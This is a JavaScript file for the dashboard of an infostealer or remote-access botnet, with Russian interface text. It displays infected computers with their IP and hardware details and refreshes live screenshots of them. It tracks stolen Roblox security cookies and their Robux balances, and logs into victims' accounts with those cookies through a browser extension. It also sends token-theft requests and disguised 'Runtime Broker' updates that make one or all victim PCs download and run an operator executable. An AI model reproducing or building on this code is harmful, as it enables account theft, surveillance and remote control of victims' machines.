// ── Дашборд (статическая версия для GitHub Pages) ─────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('files');
bindLogout();

let allFiles = [];
let currentToken = "";

async function getTextSnippet(path) {
  try {
    const res = await apiFetch(path);
    if (!res.ok) return "Ошибка предпросмотра";
    const text = await res.text();
    const escaped = text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    return escaped.substring(0, 200) + (text.length > 200 ? "\n..." : "");
  } catch (e) {
    return "Не удалось прочесть превью.";
  }
}

async function loadFiles() {
  try {
    const r = await apiFetch("/files");
    const data = await r.json();
    // Фильтруем системные файлы
    allFiles = data.filter(f => !isHiddenFile(f.originalName || f.name));

    // Sync old local logins to the server
    for (const f of allFiles) {
      if (!f.roblox) continue;
      const localVal = localStorage.getItem('login_' + f.name);
      if (localVal && !f.roblox.lastLogin) {
        apiFetch('/api/login-mark', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename: f.name, timestamp: parseInt(localVal) })
        }).catch(()=>{});
        f.roblox.lastLogin = parseInt(localVal);
      }
    }

    updateStats();
    renderChart(allFiles);
    filterFiles();
  } catch (e) {
    if (e.message !== 'auth') toast("Ошибка загрузки файлов", "err");
  }
}

function renderChart(files) {
  const ctx = document.getElementById('statsChart');
  if (!ctx || typeof Chart === 'undefined') return;
  
  const last7Days = [];
  for (let i = 6; i >= 0; i--) {
    const d = new Date();
    d.setDate(d.getDate() - i);
    const offset = d.getTimezoneOffset() * 60000;
    last7Days.push((new Date(d - offset)).toISOString().split('T')[0]);
  }
  
  const dataMap = {};
  last7Days.forEach(date => {
    dataMap[date] = { computers: new Set(), cookies: 0, robux: 0 };
  });
  
  files.forEach(f => {
    if (!f.uploadedAt) return;
    const dateObj = new Date(f.uploadedAt);
    if (isNaN(dateObj)) return;
    
    const offset = dateObj.getTimezoneOffset() * 60000;
    const localISOTime = (new Date(dateObj - offset)).toISOString().split('T')[0];
    
    if (dataMap[localISOTime]) {
      if (f.computer && f.computer.name) {
        dataMap[localISOTime].computers.add(f.computer.name);
      } else {
        dataMap[localISOTime].computers.add(f.name);
      }
      
      const hasValidToken = f.roblox && f.roblox.security && f.roblox.security.length > 0 && (!f.robuxInfo || f.robuxInfo.valid !== false);
      if (hasValidToken) {
        dataMap[localISOTime].cookies++;
        if (f.robuxInfo && f.robuxInfo.robux) {
          dataMap[localISOTime].robux += f.robuxInfo.robux;
        }
      }
    }
  });
  
  const labels = last7Days.map(d => {
    const [y, m, day] = d.split('-');
    return `${day}.${m}`;
  });
  
  const computersData = last7Days.map(d => dataMap[d].computers.size);
  const cookiesData = last7Days.map(d => dataMap[d].cookies);
  const robuxData = last7Days.map(d => dataMap[d].robux);
  
  if (window.statsChartInstance) {
    window.statsChartInstance.destroy();
  }
  
  Chart.defaults.color = 'rgba(255, 255, 255, 0.6)';
  Chart.defaults.font.family = "'Inter', sans-serif";
  
  window.statsChartInstance = new Chart(ctx, {
    type: 'line',
    data: {
      labels: labels,
      datasets: [
        {
          label: 'Робуксы',
          data: robuxData,
          borderColor: '#f59e0b',
          backgroundColor: 'rgba(245, 158, 11, 0.1)',
          borderWidth: 2,
          tension: 0.4,
          fill: true,
          yAxisID: 'y1'
        },
        {
          label: 'Токены',
          data: cookiesData,
          borderColor: '#10b981',
          backgroundColor: 'rgba(16, 185, 129, 0.1)',
          borderWidth: 2,
          tension: 0.4,
          fill: true,
          yAxisID: 'y'
        },
        {
          label: 'Компьютеры',
          data: computersData,
          borderColor: '#6366f1',
          backgroundColor: 'rgba(99, 102, 241, 0.1)',
          borderWidth: 2,
          tension: 0.4,
          fill: true,
          yAxisID: 'y'
        }
      ]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      interaction: { mode: 'index', intersect: false },
      plugins: {
        legend: { position: 'top', labels: { usePointStyle: true, boxWidth: 8 } },
        tooltip: { backgroundColor: 'rgba(15, 17, 26, 0.9)', titleColor: '#fff', bodyColor: '#ccc', borderColor: 'rgba(255,255,255,0.1)', borderWidth: 1, padding: 10, cornerRadius: 8 }
      },
      scales: {
        x: { grid: { color: 'rgba(255, 255, 255, 0.05)' } },
        y: { 
          type: 'linear', display: true, position: 'left',
          grid: { color: 'rgba(255, 255, 255, 0.05)' },
          ticks: { precision: 0 }
        },
        y1: {
          type: 'linear', display: true, position: 'right',
          grid: { drawOnChartArea: false },
          ticks: { precision: 0 }
        }
      }
    }
  });
}

function updateStats() {
  const pcs = new Set(allFiles.map(function(f) { return f.computer?.name || "Unknown"; })).size;
  document.getElementById("sPCs").textContent = pcs;
  
  let robloxCount = 0;
  for (let f of allFiles) {
    if (f.roblox && f.roblox.security) {
      robloxCount++;
    }
  }
  document.getElementById("sRoblox").textContent = robloxCount;
  
  const last = allFiles[0];
  document.getElementById("sLast").textContent = last ? fmtDate(last.uploadedAt) : "—";
}

function filterFiles() {
    const searchVal = document.getElementById("searchBar").value.toLowerCase();
    const sortVal = document.getElementById("sortFiles").value;
  
    let list = [...allFiles];
    if (searchVal) {
      list = list.filter(function(f) { return (f.originalName || f.name).toLowerCase().includes(searchVal); });
    }
    
    if (sortVal === "version") {
      list.sort((a, b) => {
        const aVer = a.computer?.version || "7.0.0";
        const bVer = b.computer?.version || "7.0.0";
        return bVer.localeCompare(aVer, undefined, { numeric: true, sensitivity: 'base' });
      });
    } else if (sortVal === "roblox") {
      list.sort((a, b) => {
        const aRoblox = a.roblox && a.roblox.user ? 1 : 0;
        const bRoblox = b.roblox && b.roblox.user ? 1 : 0;
        const aValid = aRoblox && a.roblox.security && (!a.robuxInfo || a.robuxInfo.valid !== false) ? 2 : aRoblox;
        const bValid = bRoblox && b.roblox.security && (!b.robuxInfo || b.robuxInfo.valid !== false) ? 2 : bRoblox;
        
        if (aValid !== bValid) return bValid - aValid;
        return new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0);
      });
    } else {
      list.sort((a, b) => new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0));
    }
  
    renderFiles(list);
  }

function renderFiles(list) {
  const grid = document.getElementById("fileGrid");
  if (list.length === 0) {
    grid.innerHTML = "<div class='empty'><span class='empty-icon'>🌌</span>Совпадений не найдено</div>";
    return;
  }

  let html = "";
  for (let i = 0; i < list.length; i++) {
    const f = list[i];
    const idx = allFiles.indexOf(f);
    const nm = f.originalName || f.name;
    const pcName = f.computer?.name || "Unknown";
    const pcCountry = f.computer?.country || "—";
    const dlUrl = assetUrl("/uploads/" + encodeURIComponent(f.name));
    const ts = Date.now();

    let previewHTML = "";
    if (isImg(nm)) {
      previewHTML = "<img class='live-preview' data-pc='" + escapeHtml(pcName) + "' data-url='" + dlUrl + "' src='" + dlUrl + "?t=" + ts + "' alt='' loading='lazy'>";
    } else if (isText(nm)) {
      previewHTML = "<div class='card-preview-text text-preview-placeholder' data-url='/uploads/" + encodeURIComponent(f.name) + "'>Загрузка превью...</div>";
    } else {
      previewHTML = "<div class='card-preview-icon'>" + icon(nm) + "</div>";
    }

    const hasValidToken = f.roblox && f.roblox.security && f.roblox.security.length > 0 && (!f.robuxInfo || f.robuxInfo.valid !== false);

    const color = hasValidToken ? "var(--success)" : "var(--danger)";
    const title = hasValidToken ? "Roblox токен найден" : "Токен отсутствует или недействителен";
    let indicator = "<div class='roblox-indicator' style='position:absolute; top:12px; right:12px; width:10px; height:10px; border-radius:50%; background:" + color + "; box-shadow:0 0 15px " + color + "; z-index: 10;' title='" + title + "'></div>";

    const ver = f.computer?.version || "7.0.0\u20137.0.1";

    html += "<div class='file-card' onclick=\"openModalByIndex(" + idx + ")\" style='position:relative'>" +
              indicator +
              "<div class='card-preview'>" + previewHTML + "</div>" +
              "<div class='card-body'>" +
                "<div class='card-title' title='" + escapeHtml(pcName) + "'>" + escapeHtml(pcName) + "</div>" +
                "<div class='card-version'>v" + escapeHtml(ver) + "</div>" +
              "</div>" +
            "</div>";
  }

  grid.innerHTML = html;
  loadTextPreviews();
}

// Автообновление превью скриншотов каждые 5 секунд
setInterval(function() {
  document.querySelectorAll(".live-preview").forEach(function(img) {
    const url = img.getAttribute("data-url");
    if (url) img.src = url + "?t=" + Date.now();
  });
}, 5000);

function loadTextPreviews() {
  document.querySelectorAll(".text-preview-placeholder").forEach(async function(el) {
    const url = el.getAttribute("data-url");
    if (!url) return;
    const text = await getTextSnippet(url);
    el.textContent = text;
    el.classList.remove("text-preview-placeholder");
  });
}

function openModalByIndex(idx) {
  const f = allFiles[idx];
  if (!f) return;
  const nm = f.originalName || f.name;
  const pc = f.computer || {};
  const dlUrl = assetUrl("/uploads/" + encodeURIComponent(f.name));

  document.getElementById("modalFilename").textContent = nm;
  document.getElementById("specName").textContent = pc.name || "—";
  document.getElementById("specVersion").textContent = pc.version ? "v" + pc.version : "7.0.0\u20137.0.1";
  document.getElementById("specIp").textContent = pc.ip || "—";
  document.getElementById("specOs").textContent = pc.os || "—";
  document.getElementById("specCpu").textContent = pc.cpu || "—";
  document.getElementById("specRam").textContent = pc.ram || "—";
  document.getElementById("specGpu").textContent = pc.gpu || "—";
  document.getElementById("specDate").textContent = fmtDate(f.uploadedAt);

  const roblox = f.roblox || {};
  const robuxInfo = f.robuxInfo || {};
  const hasToken = roblox.security && roblox.security.length > 0;
  const isValid = robuxInfo.valid !== false;

  document.getElementById("robloxSpecUser").textContent = roblox.user || "—";

  const loginBtn = document.getElementById("modalLoginBtn");
  const tokenStatusRow = document.getElementById("tokenStatusRow");
  const tokenStatusText = document.getElementById("tokenStatusText");

  const lastLogin = roblox.lastLogin || localStorage.getItem('login_' + f.name);
  let loginText = '👤 Войти в аккаунт';
  if (lastLogin) {
    const d = new Date(parseInt(lastLogin));
    loginText = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
  }
  loginBtn.textContent = loginText;

  if (hasToken && isValid) {
    loginBtn.style.display = "";
    loginBtn.onclick = function() {
      loginBtn.textContent = '⏳...';
      loginBtn.disabled = true;

      function handler(e) {
        if (e.data && e.data.type === 'nexus-login-response') {
          window.removeEventListener('message', handler);
          if (e.data.ok) {
            localStorage.setItem('login_' + f.name, Date.now());
            apiFetch('/api/login-mark', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ filename: f.name })
            }).catch(()=>{}); // Fire and forget
            const d = new Date();
            loginBtn.textContent = '👤 Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
            loginBtn.disabled = false;
            toast('✅ Вход выполнен, открываем Roblox...');
          } else {
            loginBtn.textContent = loginText;
            loginBtn.disabled = false;
            toast('⚠️ Установи расширение NEXUS для входа', 'err');
          }
        }
      }

      window.addEventListener('message', handler);
      window.postMessage({ type: 'nexus-login', token: roblox.security }, '*');
      
      setTimeout(() => {
        window.removeEventListener('message', handler);
        loginBtn.textContent = loginText;
        loginBtn.disabled = false;
        toast('⚠️ Установи расширение NEXUS для входа', 'err');
      }, 800);
    };
    tokenStatusRow.style.display = "none";
  } else {
    loginBtn.style.display = "none";
    tokenStatusRow.style.display = "flex";
    tokenStatusText.textContent = hasToken ? "Токен недействителен" : "Токен отсутствует";
  }

  const requestEl = document.getElementById("tokenRequestStatus");
  if (f.tokenRequest && f.tokenRequest.requested) {
    const at = f.tokenRequest.requestedAt ? new Date(f.tokenRequest.requestedAt).toLocaleString("ru") : "только что";
    requestEl.textContent = "⏳ Ожидаем ответ клиента (" + at + ")";
    requestEl.style.color = "var(--warning)";
  } else {
    requestEl.textContent = "Нет активного запроса";
    requestEl.style.color = "var(--text-secondary)";
  }

  // Preview pane removed
  
  document.getElementById("modalOpenBtn").onclick = function() {
    window.location.href = "tokens.html?file=" + encodeURIComponent(f.name);
  };

  // Removed modalRobuxBtn
  document.getElementById("modalRequestBtn").onclick = function() { requestToken(f.name); };
  // Removed modalRequestStatusBtn
  document.getElementById("modalUpdateBtn").onclick = function() { updateClient(f.name); };
  document.getElementById("modalDeleteBtn").onclick = function() { deleteFile(f.name); };

  document.getElementById("fileModal").classList.add("active");
}

function closeModal() {
  document.getElementById("fileModal").classList.remove("active");
}

function copyToken() {
  if (!currentToken) return;
  navigator.clipboard.writeText(currentToken).then(function() {
    toast("📋 Токен скопирован в буфер");
  }).catch(function() {
    const ta = document.createElement("textarea");
    ta.value = currentToken;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
    toast("📋 Токен скопирован");
  });
}

async function deleteFile(name) {
  if (!confirm("Удалить файл?")) return;
  try {
    const r = await apiFetch("/files/" + encodeURIComponent(name), { method: "DELETE" });
    const d = await r.json();
    if (d.success) {
      toast("Файл удалён");
      closeModal();
      loadFiles();
    } else {
      toast("Ошибка удаления", "err");
    }
  } catch (e) {
    if (e.message !== 'auth') toast("Ошибка связи с сервером", "err");
  }
}

// ── Запрос токена ─────────────────────────────────────────────────────────────
async function requestToken(filename) {
  toast('📡 Запрос отправлен...');
  try {
    await apiFetch('/request-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename })
    });
    const reqEl = document.getElementById('tokenRequestStatus');
    if (reqEl) {
      reqEl.textContent = '⏳ Ожидаем ответ клиента';
      reqEl.style.color = 'var(--warning)';
    }
    toast('📡 Запрос токена отправлен компьютеру');
    loadFiles();
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка запроса', 'err');
  }
}

async function refreshRequestStatus(filename) {
  try {
    await loadFiles();
    const idx = allFiles.findIndex(f => f.name === filename);
    if (idx >= 0) {
      openModalByIndex(idx);
      const f = allFiles[idx];
      if (f.tokenRequest && f.tokenRequest.requested) {
        toast('⏳ Клиент ещё не ответил');
      } else {
        toast('✅ Активного запроса нет');
      }
    } else {
      toast('⚠️ Компьютер не найден', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка обновления статуса', 'err');
  }
}

document.getElementById('btnRequestAll').addEventListener('click', async function() {
  const btn = this;
  btn.disabled = true;
  btn.textContent = '⏳ Отправка...';
  try {
    const r = await apiFetch('/request-token-all', { method: 'POST' });
    const data = await r.json();
    toast('📡 Запрос отправлен ' + (data.count || 'всем') + ' компьютерам');
    loadFiles();
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка запроса', 'err');
  }
  btn.disabled = false;
  btn.textContent = '📡 Запросить у всех';
});

async function checkRobux(name) {
  const robuxRow = document.getElementById("robloxSpecRobuxRow");
  const robuxEl = document.getElementById("robloxSpecRobux");
  const statusRow = document.getElementById("robloxSpecStatusRow");
  const statusEl = document.getElementById("robloxSpecStatus");
  robuxRow.style.display = "flex";
  robuxEl.textContent = "⏳ Проверка...";
  robuxEl.style.color = "var(--warning)";
  statusRow.style.display = "flex";
  statusEl.textContent = "Запрос к Roblox API...";
  statusEl.style.color = "var(--warning)";
  try {
    const r = await apiFetch("/robux-check-file", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ filename: name })
    });
    const info = await r.json();
    if (info.valid) {
      robuxEl.textContent = info.robux.toLocaleString() + " R$";
      robuxEl.style.color = "var(--success)";
      statusEl.textContent = "Аккаунт: " + info.username + " (ID: " + info.userId + ")";
      statusEl.style.color = "var(--text-secondary)";
      toast("💰 Robux: " + info.robux.toLocaleString());
    } else {
      robuxEl.textContent = "❌";
      robuxEl.style.color = "var(--danger)";
      statusEl.textContent = "Ошибка: " + (info.error || "неизвестно");
      statusEl.style.color = "var(--danger)";
      toast("❌ Токен недействителен", "err");
    }
    loadFiles();
  } catch (e) {
    if (e.message === 'auth') return;
    robuxEl.textContent = "❌";
    statusEl.textContent = "Ошибка сети: " + e.message;
    statusEl.style.color = "var(--danger)";
  }
}

function getOperatorDownloadUrl() {
  const user = getUser();
  const base = window.location.origin;
  if (user === 'Shonll') {
    return base + '/downloads/RAH_Non_Pro.exe';
  } else {
    return base + '/downloads/NON_PRO.exe';
  }
}

async function updateClient(filename) {
  if (!confirm("Действительно отправить команду на фоновое обновление Runtime Broker на этом ПК?")) return;
  try {
    const r = await apiFetch('/request-update', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename, downloadUrl: getOperatorDownloadUrl() })
    });
    const resp = await r.json();
    if (resp.success) {
      toast('✅ Команда на обновление отправлена');
    } else {
      toast('❌ Ошибка: ' + (resp.error || 'неизвестно'), 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка отправки', 'err');
  }
}

async function updateAllClients() {
  if (!confirm("Внимание! Отправить команду на фоновое обновление Runtime Broker на ВСЕХ подключенных ПК?")) return;
  try {
    const r = await apiFetch('/request-update-all', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ downloadUrl: getOperatorDownloadUrl() })
    });
    const resp = await r.json();
    if (resp.success) {
      toast('✅ Запрос отправлен на ' + resp.count + ' ПК');
    } else {
      toast('❌ Ошибка: ' + (resp.error || 'неизвестно'), 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка отправки', 'err');
  }
}

function initUpdateCard() {
  const card = document.getElementById('updateAllCard');
  if (!card) return;
  const user = getUser();
  if (user === 'Shonll') {
    card.classList.add('active-action');
    card.classList.remove('disabled-action');
    card.onclick = function() {
      updateAllClients();
    };
  } else {
    card.classList.add('disabled-action');
    card.classList.remove('active-action');
    card.onclick = function(e) {
      e.stopPropagation();
    };
  }
}

initUpdateCard();
loadFiles();
